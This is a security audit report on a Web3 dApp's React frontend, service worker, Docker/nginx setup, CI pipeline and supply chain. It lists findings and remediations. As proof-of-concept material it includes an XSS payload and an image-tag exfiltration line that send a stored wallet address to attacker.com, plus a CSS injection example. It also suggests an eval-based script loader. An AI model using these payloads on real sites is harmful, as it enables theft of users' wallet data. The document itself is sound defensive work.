# GachaFi Security Audit — Frontend & Infrastructure

> **Historical review.** Current source uses supported Vite 7, zero reported npm-audit vulnerabilities at the November 2026 review, consent-gated Sentry/OneSignal, non-root nginx on 8080, location-safe security headers, and pinned CI actions. COOP/COEP are intentionally not enabled. See `COMPREHENSIVE_SECURITY_PRIVACY_AUDIT.md` for current status.

**Date:** 2026-05-06  
**Auditor:** Senior Security Engineer  
**Scope:** React 18 frontend, PWA shell (service worker, manifest), deployment configs (Docker, nginx, Netlify), CI/CD pipeline, and supply chain.  
**Excludes:** Scrypto smart contract (audited separately in `docs/security-audit.md`).  
**Method:** Manual line-by-line code review, STRIDE threat modeling, OWASP Top 10 mapping, dependency vulnerability scanning, built-artifact inspection.

---

## Executive Summary

| Category | Critical | High | Medium | Low | Informational |
|----------|----------|------|--------|-----|---------------|
| **Frontend** | 0 | 2 | 1 | 3 | 3 |
| **Infrastructure** | 0 | 0 | 3 | 3 | 2 |
| **CI / CD** | 0 | 0 | 1 | 2 | 1 |
| **Supply Chain** | 0 | 0 | 2 | 2 | 1 |
| **Total** | **0** | **2** | **7** | **10** | **7** |

**Overall Risk Rating:** 🟡 **MODERATE** — No critical vulnerabilities were found. The two highest-severity issues are a dangerously permissive Content Security Policy (`script-src 'unsafe-inline'`) and production source-map exposure. Both are straightforward to fix and would significantly harden the attack surface before mainnet launch.

**Key Recommendations:**
1. Remove `'unsafe-inline'` from `script-src` in both `nginx.conf` and `netlify.toml`.
2. Disable `sourcemap: true` in `vite.config.ts` for production builds.
3. Add Subresource Integrity to `public/OneSignalSDKWorker.js`.
4. Harden the Docker image (non-root nginx, pinned digests, read-only rootfs).

---

## 1. Threat Model: Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│                         ATTACKER                                │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────────┐  │
│  │ CDN Comprom │  │ Malicious   │  │ Modified Client Build   │  │
│  │ ise         │  │ Wallet      │  │ (skip validation)       │  │
│  └──────┬──────┘  └──────┬──────┘  └─────────────────────────┘  │
└─────────┼────────────────┼──────────────────────────────────────┘
          │                │
          ▼                ▼
┌─────────────────────────────────────────────────────────────────┐
│                      USER BROWSER                               │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  React SPA (Vite bundle)                                │   │
│  │  • All VITE_* env vars are PUBLIC (bundled into JS)    │   │
│  │  • localStorage / IndexedDB are USER-CONTROLLED        │   │
│  │  • Rate limiter is COSMETIC only                       │   │
│  │  • Source maps expose original TS source in prod       │   │
│  └─────────────────────────────────────────────────────────┘   │
│                          │                                      │
│  ┌───────────────────────┼───────────────────────────────────┐  │
│  │  Service Worker       │   IndexedDB (offline queue)       │  │
│  │  • Cache poisoning    │   • User can modify/delete        │  │
│  │    possible if        │   • No integrity verification     │  │
│  │    attacker controls  │                                   │  │
│  │    origin             │                                   │  │
│  └───────────────────────┴───────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
          │
          ▼ HTTPS
┌─────────────────────────────────────────────────────────────────┐
│                    EXTERNAL SERVICES                            │
│  • Radix Gateway (public, no auth)                              │
│  • OneSignal CDN (push notifications) — SRI on page, NOT on SW  │
│  • Sentry (error reporting) — may leak wallet addresses         │
│  • Google Fonts — SELF-HOSTED ✅                                │
└─────────────────────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────────────┐
│                    RADIX BLOCKCHAIN                             │
│  • Scrypto Contract (GachaMinter) — ONLY security boundary      │
│  • User's wallet holds private keys                             │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. Frontend Security Findings

### HIGH-1: CSP `script-src 'unsafe-inline'` Neutralises XSS Protection
**Severity:** High  
**Location:** `nginx.conf:25`, `netlify.toml:23`  
**STRIDE:** Tampering / Elevation of Privilege  
**OWASP:** A03:2021 – Injection  

**Code:**
```nginx
# nginx.conf
add_header Content-Security-Policy "... script-src 'self' 'unsafe-inline' https://cdn.onesignal.com; ..." always;
```

**Impact:** The `'unsafe-inline'` keyword in `script-src` allows any inline JavaScript to execute, including `<script>` tags injected via XSS, event handlers (`onclick`, `onerror`), and `javascript:` URLs. This completely defeats the XSS mitigation that CSP is designed to provide. An attacker who finds a DOM-XSS vector (e.g., via a compromised npm dependency, an open redirect, or a future code change) can execute arbitrary code in the context of the dApp, potentially manipulating transaction manifests or stealing wallet session data.

**Proof of Concept:**
```html
<!-- If an attacker can inject this anywhere in the DOM, it executes immediately -->
<img src=x onerror="window.location='https://attacker.com/?addr='+localStorage.getItem('radixWalletAddress')">
```

**Remediation:** Remove `'unsafe-inline'` from `script-src`. The production build (`dist/index.html`) contains no inline scripts — all JS is loaded via `<script type="module" src="/assets/...">`. OneSignal is already loaded externally with SRI.

```nginx
# nginx.conf — hardened script-src
script-src 'self' https://cdn.onesignal.com;
```

If a future dependency genuinely requires an inline script, use a `nonce` or `sha256-*` hash instead of blanket `'unsafe-inline'`.

**Verification:** After the change, open DevTools → Console. The following should produce a CSP violation:
```javascript
const s = document.createElement('script'); s.textContent = 'console.log(1)'; document.body.appendChild(s);
```

---

### HIGH-2: Production Source Maps Expose Full TypeScript Source
**Severity:** High  
**Location:** `vite.config.ts:23`, `dist/assets/*.js.map`  
**STRIDE:** Information Disclosure  
**OWASP:** A01:2021 – Broken Access Control (information disclosure variant)

**Code:**
```typescript
// vite.config.ts
build: {
  outDir: 'dist',
  sourcemap: true,   // ← exposes original source in production
  minify: 'esbuild',
  ...
}
```

**Impact:** The production build includes `.js.map` files (e.g., `dist/assets/index-NjHPvQnP.js.map`, ~199 KB). These map the minified bundle back to the original TypeScript source code, including:
- Exact validation regexes (`walletAddressSchema`)
- Internal component structure and state management
- Error handling logic and retry patterns
- Feature flag evaluation logic
- Smart contract interaction code (`mintGachaBadge` manifest builder)

An attacker can download these maps, reconstruct the entire codebase, and perform targeted vulnerability research against the application. For a Web3 dApp handling real cryptocurrency, this dramatically reduces the cost of finding and exploiting logic flaws.

**Proof:**
```bash
curl https://<app-domain>/assets/index-NjHPvQnP.js.map | jq '.sourcesContent[0]' | head -c 500
# Returns full original TypeScript source.
```

**Remediation:** Disable source maps for production builds. Keep them for staging/development only.

```typescript
// vite.config.ts
build: {
  outDir: 'dist',
  sourcemap: process.env.SOURCE_MAP === 'true', // or false by default
  minify: 'esbuild',
  ...
}
```

If source maps are needed for Sentry error decoding, upload them directly to Sentry during CI and do NOT deploy them to the CDN:
```yaml
# .github/workflows/ci.yml (add Sentry sourcemap upload step)
- name: Upload source maps to Sentry
  run: npx @sentry/cli sourcemaps upload dist/
  env:
    SENTRY_AUTH_TOKEN: ${{ secrets.SENTRY_AUTH_TOKEN }}
```

Then add a build step that strips `.js.map` files before deployment:
```bash
rm -f dist/assets/*.js.map
```

---

### MEDIUM-1: OneSignal Service Worker Imports External Script Without SRI
**Severity:** Medium  
**Location:** `public/OneSignalSDKWorker.js:1`  
**STRIDE:** Tampering (supply chain)  
**OWASP:** A08:2021 – Software and Data Integrity Failures  

**Code:**
```javascript
// public/OneSignalSDKWorker.js
importScripts('https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js');
```

**Impact:** While the OneSignal page script in `index.html` is protected by SRI (`integrity="sha384-..."`), the service worker loads the **same file** via `importScripts()` without any integrity check. Service workers run in a privileged context and can intercept network requests. If `cdn.onesignal.com` is compromised, the malicious script executes inside the service worker scope with the ability to:
- Intercept and modify all network requests (including Radix Gateway API calls)
- Persist malicious code across browser sessions
- Serve poisoned cached responses

**Remediation:** Add SRI to the `importScripts` call. Unfortunately, `importScripts()` does not natively support an `integrity` attribute. The recommended approach is to:

1. **Self-host the OneSignal SDK worker script** (download the exact version, verify its hash, and serve it from `/OneSignalSDKWorker.js` or a sub-path).
2. **Alternatively**, use a wrapper that fetches the script with `fetch()`, verifies the hash manually, and then evaluates it:

```javascript
// public/OneSignalSDKWorker.js — hardened
const ONESIGNAL_URL = 'https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js';
const EXPECTED_HASH = 'sha384-9WymDdowrrUwJuXZ2joqlQYNQSPWfKsyBecZsqaJgsTur2qmjjrc3YQVGiaFdFdA';

async function verifyAndLoad() {
  const response = await fetch(ONESIGNAL_URL, { integrity: EXPECTED_HASH });
  if (!response.ok) throw new Error('OneSignal SDK fetch failed');
  const text = await response.text();
  // Evaluate in worker global scope
  eval?.(text); // eslint-disable-line no-eval
}

verifyAndLoad().catch(err => {
  console.error('OneSignal SDK integrity check failed:', err);
});
```

> **Caution:** `eval` in a worker is generally discouraged, but in this specific case it is a strict improvement over `importScripts` with no verification. The best long-term fix is to self-host the SDK.

---

### LOW-1: Broad `img-src 'self' data: https:` Enables Data Exfiltration
**Severity:** Low  
**Location:** `nginx.conf:28`, `netlify.toml:23`  
**STRIDE:** Information Disclosure  
**OWASP:** A03:2021 – Injection (data exfiltration via CSS/img)

**Code:**
```nginx
img-src 'self' data: https:;
```

**Impact:** The `https:` scheme source allows loading images from **any** HTTPS domain. If an attacker can inject an `<img>` tag (e.g., via a stored XSS in a future feature, or a compromised dependency), they can exfiltrate sensitive data via the URL query string:

```html
<img src="https://attacker.com/exfil?data=localStorage.getItem('radixWalletAddress')">
```

While this is partially mitigated by React's XSS protections, a overly broad `img-src` removes a valuable defense-in-depth layer.

**Remediation:** Restrict `img-src` to known domains:
```nginx
img-src 'self' data: https://cdn.onesignal.com https://*.radixdlt.com;
```

If the app needs to display arbitrary user-provided images (e.g., NFT metadata), consider proxying them through a same-origin endpoint or using a separate sandboxed iframe.

---

### LOW-2: `dangerouslySetInnerHTML` in Chart Component Allows CSS Injection
**Severity:** Low  
**Location:** `src/components/ui/chart.tsx:70`  
**STRIDE:** Tampering  
**OWASP:** A03:2021 – Injection

**Code:**
```tsx
// src/components/ui/chart.tsx:70
<style
  dangerouslySetInnerHTML={{
    __html: Object.entries(THEMES)
      .map(([theme, prefix]) => `
${prefix} [data-chart=${id}] {
${colorConfig
  .map(([key, itemConfig]) => {
    const color = itemConfig.theme?.[theme] || itemConfig.color;
    return color ? `  --color-${key}: ${color};` : null;
  })
  .join("\n")}
}
`,
      )
      .join("\n"),
  }}
/>
```

**Impact:** The `ChartStyle` component renders CSS via `dangerouslySetInnerHTML`. The `id` is sanitized (`uniqueId.replace(/:/g, "")`), but `color` values are injected directly from the `config` prop without validation. If a caller passes a user-controlled color string, it could inject arbitrary CSS:

```tsx
// Hypothetical attacker-controlled input
<ChartContainer config={{ revenue: { color: 'red; } body { background: url(https://attacker.com) } /*' } }}>
```

This is currently theoretical because all `config` values in the app are hardcoded, but the component is part of a reusable UI library and could be misused in future features.

**Remediation:** Validate or sanitize color values before injection:
```typescript
const isValidColor = (color: string): boolean =>
  /^#([0-9A-F]{3}){1,2}$/i.test(color) ||
  /^rgb\(.*\)$/i.test(color) ||
  /^hsl\(.*\)$/i.test(color);
```

---

### LOW-3: Missing Cross-Origin Isolation Headers
**Severity:** Low  
**Location:** `nginx.conf`, `netlify.toml`  
**STRIDE:** Information Disclosure / Elevation of Privilege  
**OWASP:** A05:2021 – Security Misconfiguration

**Impact:** The application does not set:
- `Cross-Origin-Embedder-Policy` (COEP)
- `Cross-Origin-Opener-Policy` (COOP)
- `Cross-Origin-Resource-Policy` (CORP)

Without these, the page is vulnerable to cross-origin attacks such as:
- **Spectre-style attacks** (cross-origin memory read via shared browsing context)
- **Cross-origin leaks** via `window.opener` manipulation
- **Resource hijacking** via `<img>`/`<script>` tags from other origins

**Remediation:** Add the following headers (they are safe for a static SPA):
```nginx
add_header Cross-Origin-Embedder-Policy "require-corp" always;
add_header Cross-Origin-Opener-Policy "same-origin" always;
add_header Cross-Origin-Resource-Policy "same-origin" always;
```

> **Note:** Setting `require-corp` will block any cross-origin resource that does not send a `Cross-Origin-Resource-Policy` header. Since the app currently loads OneSignal from a CDN and connects to Radix gateways, verify that these services support CORS/CORP before enabling in production. A safer starting point is `COEP: credentialless` (Chromium-only) or omitting it until all third-party resources are confirmed compatible.

---

### INFO-1: No Content Security Policy Reporting Endpoint
**Severity:** Informational  
**Status:** Still open from previous audit (`docs/security-audit.md` INFO-3)  
**Location:** `nginx.conf`, `netlify.toml`  

The CSP is well-configured but lacks a `report-uri` or `report-to` directive. Violations (which could indicate XSS attempts or unexpected third-party scripts) go unnoticed.

**Remediation:** Add a reporting endpoint. Free options include Report-URI.com or a self-hosted endpoint that logs to Sentry.

---

### INFO-2: Client-Side State is Fully User-Controllable
**Severity:** Informational  
**Status:** Documented and accepted  
**Location:** `localStorage`, `IndexedDB`, `src/lib/rateLimiter.ts`, `src/contexts/GameContext.tsx`  

All client-side "security" measures are trivially bypassable:
- Clear `localStorage` → rate limiter resets
- Edit `gachafi.completedDates.v2` → fake streaks
- Delete IndexedDB → offline queue disappears

**Acceptance:** This is a known limitation of pure client-side DApps. The smart contract is the real security boundary. If streaks ever confer economic benefits, they MUST be verified on-chain.

---

### INFO-3: PWA Standalone Mode Hides Browser Chrome
**Severity:** Informational  
**Location:** `public/manifest.json:6`  

`"display": "standalone"` removes the browser address bar and security indicators when the app is installed. This makes it harder for users to verify the domain and detect phishing clones. Combined with the fact that the app handles cryptocurrency transactions, this is a social-engineering risk.

**Remediation:** Consider `"display": "minimal-ui"` instead, which keeps a minimal URL bar. If `standalone` is required for UX, document the risk in user-facing security guidance.

---

---

## 3. Infrastructure & Deployment Security Findings

### MEDIUM-2: nginx Container Runs as Root
**Severity:** Medium  
**Location:** `Dockerfile:56-69`  
**STRIDE:** Elevation of Privilege  
**OWASP:** A05:2021 – Security Misconfiguration

**Code:**
```dockerfile
# Dockerfile:56-69
FROM nginx:alpine AS runtime
COPY nginx.conf /etc/nginx/conf.d/default.conf
COPY --from=builder /app/dist /usr/share/nginx/html
RUN addgroup -S app && adduser -S app -G app \
    && chown -R app:app /usr/share/nginx/html
HEALTHCHECK ...
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]
```

**Impact:** The `app:app` user only owns the static files. The nginx **master process** still runs as `root` inside the container. If nginx or an OpenSSL dependency has a vulnerability that allows remote code execution, the attacker gains root privileges inside the container, making container escape more likely.

**Remediation:** Run nginx as an unprivileged user. The official `nginx:alpine` image supports this with the `nginx` user, or use `nginxinc/nginx-unprivileged`:

```dockerfile
# Option 1: Use unprivileged nginx image
FROM nginxinc/nginx-unprivileged:alpine
COPY nginx.conf /etc/nginx/conf.d/default.conf
COPY --from=builder --chown=nginx:nginx /app/dist /usr/share/nginx/html
EXPOSE 8080
```

```dockerfile
# Option 2: Configure existing image to drop privileges
FROM nginx:alpine
RUN sed -i 's/user  nginx;/user  app;/g' /etc/nginx/nginx.conf
# ... rest of config
USER app
```

---

### MEDIUM-3: nginx `server_tokens` Not Disabled
**Severity:** Medium  
**Location:** `nginx.conf`  
**STRIDE:** Information Disclosure  
**OWASP:** A05:2021 – Security Misconfiguration

**Impact:** The nginx configuration does not include `server_tokens off;`. This leaks the exact nginx version in the `Server` response header and on auto-generated error pages (e.g., 404, 502). Version disclosure aids attackers in selecting known exploits.

**Remediation:** Add to `nginx.conf` inside the `server` block:
```nginx
server_tokens off;
```

---

### MEDIUM-4: Docker Base Images Use Floating Tags
**Severity:** Medium  
**Location:** `Dockerfile:10`, `Dockerfile:56`  
**STRIDE:** Tampering (supply chain)  
**OWASP:** A06:2021 – Vulnerable and Outdated Components

**Code:**
```dockerfile
FROM node:20-alpine AS builder
...
FROM nginx:alpine AS runtime
```

**Impact:** `node:20-alpine` and `nginx:alpine` are floating tags. A rebuild six months from now could pull a completely different base image — possibly one with a critical vulnerability, or a maliciously compromised image if the Docker Hub account is breached.

**Remediation:** Pin images to a specific digest:
```dockerfile
FROM node:20-alpine@sha256:7e227295e96f5b00a795add89a6fa23e27ece5c29d2b01e6025b8ab07b661c7e AS builder
FROM nginx:alpine@sha256:9a53a65e3f4d... AS runtime
```

Use Renovate or Dependabot to propose digest updates on a schedule.

---

### LOW-4: Docker Compose Lacks Resource Limits
**Severity:** Low  
**Location:** `docker-compose.yml`  
**STRIDE:** Denial of Service  
**OWASP:** A05:2021 – Security Misconfiguration

**Impact:** No CPU, memory, or I/O limits are defined. A memory leak in nginx or a malicious request that triggers excessive resource consumption could exhaust the host.

**Remediation:**
```yaml
services:
  gachafi:
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 256M
        reservations:
          cpus: '0.25'
          memory: 128M
```

---

### LOW-5: HTTP Port Exposed Without TLS Redirect
**Severity:** Low  
**Location:** `docker-compose.yml:21`  
**STRIDE:** Information Disclosure  
**OWASP:** A02:2021 – Cryptographic Failures

**Impact:** `docker-compose.yml` exposes port `3000:80`. If deployed on a host with a public IP and no reverse proxy (e.g., during early testing), the app is accessible over plain HTTP. The `Strict-Transport-Security` header is only honored over HTTPS and does not redirect HTTP clients.

**Remediation:** Document that the Docker container MUST sit behind a TLS-terminating reverse proxy (Traefik, Caddy, AWS ALB, Cloudflare, etc.) in production. Alternatively, add a comment in `docker-compose.yml`:
```yaml
# WARNING: This container serves plain HTTP. Deploy behind a TLS reverse proxy.
```

---

### LOW-6: Missing `upgrade-insecure-requests` in CSP
**Severity:** Low  
**Location:** `nginx.conf`, `netlify.toml`  
**STRIDE:** Information Disclosure  
**OWASP:** A02:2021 – Cryptographic Failures

**Impact:** If a user accesses the app via HTTP (e.g., after a DNS hijacking or on a compromised network), the browser will not automatically upgrade subresources to HTTPS.

**Remediation:** Add to the CSP directive:
```
upgrade-insecure-requests;
```

---

### INFO-4: Dockerfile Build Args Expose All Config at Build Time
**Severity:** Informational  
**Status:** Verified safe — multi-stage build discards builder layer  
**Location:** `Dockerfile:19-47`  

All `VITE_*` values are passed as `ARG` and then `ENV` in the builder stage. Since the runtime image only copies `dist/`, the env vars do not persist in the final image. However, CI build logs may still leak them if GitHub Actions masking fails.

**Remediation:** Continue using `secrets.*` for sensitive values in CI (already done). Periodically audit GitHub Actions logs to ensure masking is working.

---

---

## 4. CI / CD Pipeline Findings

### MEDIUM-5: CI Lacks SAST and Dependency License Scanning
**Severity:** Medium  
**Status:** Partially resolved (TruffleHog added)  
**Location:** `.github/workflows/ci.yml`  
**STRIDE:** Tampering / Information Disclosure  
**OWASP:** A06:2021 – Vulnerable and Outdated Components

**Impact:** The pipeline runs lint, type-check, test, build, `npm audit`, and TruffleHog secret scanning. It is missing:
- **Static Application Security Testing (SAST)** — e.g., Semgrep, CodeQL, or SonarQube
- **Dependency license compliance** — e.g., `license-checker` or FOSSA
- **Container image scanning** — e.g., Trivy or Snyk Container
- **SARIF output** — none of the security jobs produce SARIF for GitHub Advanced Security

**Remediation:** Add a SAST job using Semgrep (fast, free for open source):
```yaml
sast:
  name: Static analysis
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v4
    - uses: returntocorp/semgrep-action@v1
      with:
        config: >-
          p/security-audit
          p/owasp-top-ten
          p/react
```

Add license scanning:
```yaml
- name: Check dependency licenses
  run: npx license-checker --onlyAllow 'MIT;Apache-2.0;BSD-3-Clause;ISC;0BSD'
```

---

### LOW-7: CI Build Artifact Retention Exposes Bundled Env Vars
**Severity:** Low  
**Location:** `.github/workflows/ci.yml:62-68`  
**STRIDE:** Information Disclosure  
**OWASP:** A05:2021 – Security Misconfiguration

**Code:**
```yaml
- name: Upload build artefact
  if: github.event_name == 'pull_request'
  uses: actions/upload-artifact@v4
  with:
    name: dist
    path: dist
    retention-days: 7
```

**Impact:** The `dist` artifact is uploaded on every PR and retained for 7 days. While `VITE_*` env vars are public by design, the artifact also includes the fully compiled bundle with any hardcoded values. If a developer accidentally commits a secret into source code (e.g., a hardcoded API key in a component), it would be bundled into `dist` and uploaded as an artifact. TruffleHog may not catch secrets in compiled/minified JS.

**Remediation:** This is a defense-in-depth measure. Options:
1. Reduce artifact retention to 1 day for PR builds.
2. Run a second secret scan on the `dist/` directory before upload.
3. Only upload artifacts on `main` branch builds (where they are needed for deployment).

---

### LOW-8: No SBOM Generation or Signature Verification
**Severity:** Low  
**Location:** `.github/workflows/ci.yml`  
**STRIDE:** Tampering  
**OWASP:** A08:2021 – Software and Data Integrity Failures

**Impact:** There is no Software Bill of Materials (SBOM) generated during CI, and no code-signing or artifact attestation. If a supply-chain attack injects a malicious dependency, there is no auditable inventory of what was shipped.

**Remediation:** Generate an SBOM and attest the build:
```yaml
- name: Generate SBOM
  run: npm sbom --format cyclonedx > dist/sbom.json
- name: Attest build provenance
  uses: actions/attest-build-provenance@v1
  with:
    subject-path: dist
```

---

### INFO-5: Branch Protection Documented but Not Enforceable in Code
**Severity:** Informational  
**Status:** Documented in `docs/BRANCH_PROTECTION.md`  
**Location:** Repository settings  

Branch protection rules are documented but must be manually configured in GitHub Settings. Ensure they are actually applied to `main` and `develop`.

---

---

## 5. Supply Chain Security Findings

### MEDIUM-6: OneSignal SDK Worker Lacks SRI (Supply Chain Gap)
**Severity:** Medium  
**Status:** Separate from MEDIUM-1; emphasises supply-chain angle  
**Location:** `public/OneSignalSDKWorker.js:1`  
**STRIDE:** Tampering  
**OWASP:** A08:2021 – Software and Data Integrity Failures

See **MEDIUM-1** for full details. From a supply-chain perspective, this is a second independent loading point for the OneSignal SDK that bypasses the SRI hash on the page script. Both the page script and the worker script should be integrity-protected.

---

### MEDIUM-7: `lovable-tagger` Development Plugin in Dependencies
**Severity:** Medium  
**Location:** `package.json:93`, `vite.config.ts:14`  
**STRIDE:** Tampering  
**OWASP:** A06:2021 – Vulnerable and Outdated Components

**Code:**
```json
"lovable-tagger": "^1.1.9",
```

**Impact:** `lovable-tagger` is a development-only plugin, but it is listed in `devDependencies` and loaded conditionally (`mode === 'development'`). The package is not widely audited and comes from a niche vendor. If its NPM account is compromised, a malicious version could be published and automatically installed by developers.

**Remediation:**
1. Pin to an exact version: `"lovable-tagger": "1.1.9"` (remove `^`).
2. Consider removing it entirely before mainnet launch if it is not essential for production builds.
3. Add it to `.npmrc` with `engine-strict=true` and audit its dependencies separately.

---

### LOW-9: `npm audit` Only Runs at `high` Level
**Severity:** Low  
**Location:** `.github/workflows/ci.yml:87`  
**STRIDE:** Tampering  
**OWASP:** A06:2021 – Vulnerable and Outdated Components

**Code:**
```yaml
- name: npm audit (high+)
  run: npm audit --audit-level=high
```

**Impact:** Moderate-severity vulnerabilities (`moderate` level in npm audit) are ignored. In a Web3 context, even moderate vulnerabilities in cryptographic or networking libraries can be exploitable.

**Remediation:** Lower the threshold to `moderate` for mainnet builds, with an explicit allow-list for any moderate findings that are accepted risks:
```yaml
- name: npm audit (moderate+)
  run: npm audit --audit-level=moderate || true  # don't fail CI, but log
```

Better yet, use `better-npm-audit` to maintain an allow-list:
```bash
npx better-npm-audit audit --exclude 1234,5678
```

---

### LOW-10: No `package-lock.json` Integrity Verification Step
**Severity:** Low  
**Location:** `.github/workflows/ci.yml:32`, `Dockerfile:16`  
**STRIDE:** Tampering  
**OWASP:** A08:2021 – Software and Data Integrity Failures

**Impact:** `npm ci` verifies the lockfile implicitly, but there is no explicit step that checks whether `package-lock.json` has been tampered with (e.g., a malicious actor submitting a PR that swaps a dependency hash).

**Remediation:** Add an explicit integrity check in CI:
```yaml
- name: Verify lockfile integrity
  run: npm audit signatures
```

This uses npm's signature verification to ensure all packages in the lockfile were signed by their publishers.

---

### INFO-6: `elliptic` Low-Severity CVE in Dev Dependency
**Severity:** Informational  
**Status:** Carried forward from `docs/security-audit.md` — still present  
**Location:** `package-lock.json` (via `@radixdlt/radix-engine-toolkit`)  

The `elliptic` package (CVE GHSA-848j-6mx2-7j84) remains in the dependency tree via `@radixdlt/radix-engine-toolkit`. It is **not bundled into the browser application** — the browser bundle uses `@radixdlt/radix-dapp-toolkit` (v2.1.1), which does not depend on `elliptic`. Continue monitoring for updates but no immediate action required.

---

---

## 6. Service Worker & PWA Security

### LOW-11: Service Worker Caches Assets Without Integrity Verification
**Severity:** Low  
**Location:** `public/sw.js:98-114`  
**STRIDE:** Tampering  
**OWASP:** A08:2021 – Software and Data Integrity Failures

**Code:**
```javascript
// public/sw.js:98-114
if (isSameOrigin && isStaticAsset) {
  event.respondWith(
    caches.open(CACHE_NAME).then(async (cache) => {
      const cached = await cache.match(request);
      const networkFetch = fetch(request).then((response) => {
        if (response && response.status === 200) {
          cache.put(request, response.clone());
        }
        return response;
      });
      return cached || networkFetch;
    })
  );
  return;
}
```

**Impact:** The service worker implements stale-while-revalidate caching for static assets. If the origin server is compromised and serves a malicious JS file (e.g., `assets/index-*.js`), the service worker will cache it indefinitely for offline use. This persists the compromise across browser sessions until the cache version is bumped.

**Remediation:** This is a fundamental limitation of same-origin service workers. Mitigations include:
1. **Short cache TTLs** for JS (already implemented via network-first for navigations).
2. **Subresource Integrity hashes** in the HTML (Vite does not emit SRI for self-hosted chunks by default; a plugin like `vite-plugin-manifest-sri` can generate them).
3. **Frequent cache-busting** — ensure `CACHE_NAME` is incremented on every release (currently manual: `gachafi-shell-v5`). Consider automating this via a CI script that reads `package.json` version.

```javascript
// public/sw.js
const CACHE_NAME = `gachafi-shell-${import.meta.env.VITE_APP_VERSION || 'unknown'}`;
```

---

### LOW-12: PWA Install Prompt Can Be Triggered by Any Origin Clone
**Severity:** Low  
**Location:** `src/utils/pwa.ts`, `public/manifest.json`  
**STRIDE:** Spoofing  
**OWASP:** A07:2021 – Identification and Authentication Failures

**Impact:** The PWA manifest and service worker registration logic are public. An attacker who clones the site to a phishing domain can reuse the same manifest and SW, making the clone installable with the same icon and standalone behavior. Users may not notice they installed a malicious clone.

**Remediation:**
1. Add `related_applications` to the manifest pointing to official app stores (if any):
```json
"related_applications": [],
"prefer_related_applications": false
```
2. Document in user-facing FAQs that the official app is ONLY installable from the canonical domain.
3. Consider adding a domain-verification check on startup that warns users if `window.location.origin` is not the expected value.

---

---

## 7. Sentry & Observability Findings

### LOW-13: Sentry May Capture Wallet Addresses in Automatic Breadcrumbs
**Severity:** Low  
**Location:** `src/lib/logger.ts`, `src/contexts/WalletContext.tsx`  
**STRIDE:** Information Disclosure  
**OWASP:** A09:2021 – Security Logging and Monitoring Failures

**Impact:** While `sanitizeForLogging` truncates wallet addresses in manual logger calls, Sentry's **automatic error capture** (e.g., unhandled promise rejections, React component errors) may include the full wallet address in:
- Component props
- Redux / React Query state snapshots
- Fetch request URLs (`/state/entity/details` with the address in the body)
- Error messages from the Radix toolkit

The `beforeSend` hook in `initSentry` only filters by level (`info`/`debug`). It does not scrub PII.

**Remediation:** Add a `beforeSend` scrubber for wallet addresses and transaction hashes:
```typescript
Sentry.init({
  dsn,
  beforeSend(event) {
    const scrub = (str: string) => str.replace(/account_(tdx_2_1|rdx1)[a-z0-9]{50,65}/g, '[WALLET_ADDRESS]');
    if (event.message) event.message = scrub(event.message);
    if (event.exception?.values) {
      for (const ex of event.exception.values) {
        if (ex.value) ex.value = scrub(ex.value);
      }
    }
    // Also scrub breadcrumbs
    if (event.breadcrumbs) {
      for (const crumb of event.breadcrumbs) {
        if (typeof crumb.message === 'string') crumb.message = scrub(crumb.message);
        if (typeof crumb.data?.url === 'string') crumb.data.url = scrub(crumb.data.url);
      }
    }
    return event;
  },
});
```

---

---

## 8. OWASP Top 10 Mapping (2021)

| # | Category | Status | Notes |
|---|----------|--------|-------|
| A01 | Broken Access Control | ✅ Mitigated | Smart contract enforces admin-only ops; no backend to attack |
| A02 | Cryptographic Failures | 🟡 Partial | HSTS enabled; missing `upgrade-insecure-requests`; Docker exposes HTTP |
| A03 | Injection | 🟡 Partial | CSP weakened by `unsafe-inline` in `script-src`; `dangerouslySetInnerHTML` in chart.tsx |
| A04 | Insecure Design | 🟡 Partial | Client-side rate limiting is cosmetic; no server-side validation |
| A05 | Security Misconfiguration | 🟡 Partial | Strong baseline but missing COEP/COOP, nginx tokens, root container |
| A06 | Vulnerable Components | 🟡 Partial | `elliptic` low-sev in dev dep; `lovable-tagger` niche vendor; no SAST in CI |
| A07 | Identification & Auth Failures | ✅ N/A | Auth delegated to Radix wallet (Web3 model) |
| A08 | Software & Data Integrity Failures | 🟡 Partial | SRI on OneSignal page script ✅; missing SRI on worker; source maps exposed; no SBOM |
| A09 | Security Logging & Monitoring Failures | 🟡 Partial | Sentry for errors; no CSP reporting endpoint; wallet PII may leak to Sentry |
| A10 | Server-Side Request Forgery | ✅ N/A | No server-side code; all requests originate from client |

---

## 9. Action Items (Prioritized)

### Immediate (Before Mainnet)

- [ ] **HIGH-1:** Remove `'unsafe-inline'` from `script-src` in `nginx.conf` and `netlify.toml`
- [ ] **HIGH-2:** Disable `sourcemap: true` in `vite.config.ts` for production; upload maps to Sentry privately if needed
- [ ] **MEDIUM-1 / MEDIUM-6:** Add integrity verification to `public/OneSignalSDKWorker.js` (self-host or verify hash)
- [ ] **MEDIUM-2:** Run nginx as non-root in Docker (use `nginxinc/nginx-unprivileged` or `USER` directive)
- [ ] **MEDIUM-3:** Add `server_tokens off;` to `nginx.conf`
- [ ] **MEDIUM-4:** Pin Docker base images to SHA digests
- [ ] **MEDIUM-5:** Add SAST (Semgrep) and container scanning (Trivy) to CI
- [ ] **LOW-1:** Restrict `img-src` to known domains
- [ ] **LOW-2:** Validate color inputs in `ChartStyle` component
- [ ] **LOW-3:** Add COOP/COEP/CORP headers (test with third-party resources first)
- [ ] **LOW-7:** Reduce CI artifact retention or scan `dist/` before upload
- [ ] **LOW-13:** Add wallet-address scrubbing to Sentry `beforeSend`

### Short-Term (Post-Launch)

- [ ] **LOW-4:** Add resource limits to `docker-compose.yml`
- [ ] **LOW-5:** Enforce TLS reverse proxy in deployment docs
- [ ] **LOW-6:** Add `upgrade-insecure-requests` to CSP
- [ ] **LOW-8:** Generate SBOM and attest build provenance in CI
- [ ] **LOW-9:** Lower `npm audit` threshold to `moderate`
- [ ] **LOW-10:** Add `npm audit signatures` step to CI
